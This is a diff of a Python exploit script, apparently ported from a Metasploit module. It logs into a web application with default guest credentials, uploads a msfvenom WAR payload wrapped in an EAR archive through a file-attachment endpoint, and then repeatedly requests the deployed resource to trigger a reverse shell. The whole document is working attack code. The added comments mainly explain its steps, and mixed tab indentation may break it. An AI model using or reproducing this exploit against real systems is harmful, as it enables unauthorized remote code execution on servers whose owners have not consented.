@@ -43,7 +43,7 @@ def banner():
 def make_ear(war_payload, war_app_base, ear_app_base, display_name, ear_file_name):
     # Read in the war file created by msfvenom
     ear = zipfile.ZipFile(ear_file_name + '.ear', "w")
-    #add war file to ear
+    # add war file to ear
     ear.writestr(war_app_base + '.war', war_payload)
 
     # ... and then we create an EAR file that will contain it.
@@ -79,6 +79,7 @@ def upload_request(cookie, target_uri, payload_name, payload_str):
 
     print("Uploading the payload on the server...");
 
+    # Randomization of boundary
     b = ''.join(random.choice(string.digits) for _ in range(10))
 
     target_uri += "common/FileAttachment.jsp"
@@ -87,7 +88,13 @@ def upload_request(cookie, target_uri, payload_name, payload_str):
     upload_path = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(5))
     rname1 = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(7))
 
+    ###### IMPORTANT NOTE #######
     # must change every try you make or upload will fail!!!!
+    # Altought I am not sure about this. This section is not clear.
+    # Msf module set att_desc = '' but if I do, upload will fail.
+    # It looks like the order of the payload, module var and att desc_var is important.
+    # It's not clear how the var order is managed. Upload will be fine if module first and att_desc last.
+    # This is the reason why multipe exploit run are needed to get the shell. Looks like the order is random set.
     att_desc = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(20))
 
     if '.ear' in payload_name:
@@ -114,14 +121,18 @@ def main():
         war = sys.argv[1]
         host = sys.argv[2]
         port = sys.argv[3]
+	target_uri = "http://" + host + ":" + port + "/"
         
+	# Set up of random ear app's stuff
+	# Named vars same as metasploit module to avoid errors
         rts1 = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(6)) # war_app_base
         rts2 = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16)) # ear_app_base
         rts3 = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(14)) # display_name
         rts4 = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16)) # ear_file_name
         rts5 = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(11)) # multipart 1
         rts6 = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(11)) # multipart 2
-
+        rts7 = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(9))
+	
         war_app_base = rts1
         war = open(sys.argv[1], 'rb')
         war_payload = war.read()
@@ -130,11 +141,11 @@ def main():
         ear_app_base = rts2
         display_name = rts3
         ear_file_name = rts4
-        rts7 = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(9))
-
-        make_ear(war_payload, war_app_base, ear_app_base, display_name, ear_file_name)
-
-        target_uri = "http://" + host + ":" + port + "/"
+	
+        # Here we generates ear file
+	make_ear(war_payload, war_app_base, ear_app_base, display_name, ear_file_name)
+	
+        # Login attempt - user: guest, password: guest
         cookie, url, text, status = login(target_uri, get_cookie(target_uri))
 
         if status == 200:
@@ -143,10 +154,11 @@ def main():
             print("[-] Login failed..")
             sys.exit(0)
 		
-        #bogus upload 
+        # Upload 1 - bogus upload to allow directory trasversal issues
+	# Uploads random strings
         cookie, text, status = upload_request(cookie, target_uri, rts5, rts6)
 
-        #payload uploas
+        # Upload true ear payload
         payload_name = ear_app_base
         ear = open(ear_file_name + '.ear', 'rb')
         ear_file = ear.read()
@@ -159,6 +171,12 @@ def main():
             print("[-] Upload gone wrong :/")
             sys.exit(0)
 
+	### IMPORTANT NOTE ####
+	# Attempting to launch the payload on the deployed war.
+	# this section is not very clear, I don't get why the msf module GET a resource trying random names (10 tries)
+	# GET http://host:port/random (ear_app_base)/random (war_app_base)/random (rts7)
+	# ear_app_base and war_app_base are ok, they are stored inside ear xml file, but what about rts7?
+	# rts7 is not stored anywhere online, so how this resource can be retrieved? where's the trick?
         for i in range(10):
             if run_payload(target_uri, ear_app_base, war_app_base, rts7) == 200:
                 print("[+] Hurray! Incoming reverse shell!")
